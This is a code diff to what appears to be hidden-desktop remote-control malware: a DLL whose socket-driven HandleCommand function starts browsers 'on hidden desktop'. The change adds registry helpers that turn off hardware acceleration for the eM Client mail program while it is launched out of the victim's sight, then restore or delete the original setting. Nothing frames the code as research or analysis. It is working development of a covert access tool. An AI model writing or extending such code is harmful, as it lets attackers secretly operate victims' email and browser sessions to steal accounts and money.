@@ -1986,6 +1986,37 @@ static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<
     } catch (...) {}
 }
 
+static bool write_registry_dword(HKEY hKeyParent, const wstring& subkey, const wstring& valueName, DWORD value) {
+    HKEY hKey = NULL;
+    if (RegCreateKeyExW(hKeyParent, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        LONG res = RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
+        RegCloseKey(hKey);
+        return res == ERROR_SUCCESS;
+    }
+    return false;
+}
+
+static bool read_registry_dword(HKEY hKeyParent, const wstring& subkey, const wstring& valueName, DWORD& outValue) {
+    HKEY hKey = NULL;
+    if (RegOpenKeyExW(hKeyParent, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD size = sizeof(DWORD);
+        LONG res = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, (LPBYTE)&outValue, &size);
+        RegCloseKey(hKey);
+        return res == ERROR_SUCCESS;
+    }
+    return false;
+}
+
+static bool delete_registry_value(HKEY hKeyParent, const wstring& subkey, const wstring& valueName) {
+    HKEY hKey = NULL;
+    if (RegOpenKeyExW(hKeyParent, subkey.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        LONG res = RegDeleteValueW(hKey, valueName.c_str());
+        RegCloseKey(hKey);
+        return res == ERROR_SUCCESS;
+    }
+    return false;
+}
+
 static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
     HANDLE hSrc = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hSrc == INVALID_HANDLE_VALUE) return false;
@@ -2475,6 +2506,14 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    bool isEMClient = (wRequestedPath == L"eM Client");
+                    bool hasOldVal = false;
+                    DWORD oldVal = 0;
+                    if (isEMClient) {
+                        hasOldVal = read_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
+                        write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
                         CloseHandle(pi.hProcess);
@@ -2483,6 +2522,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         send_status("Browser started on hidden desktop");
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
+
+                    if (isEMClient) {
+                        Sleep(500);
+                        if (hasOldVal) {
+                            write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
+                        } else {
+                            delete_registry_value(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
+                        }
                     }
 
                     if (isGecko) {
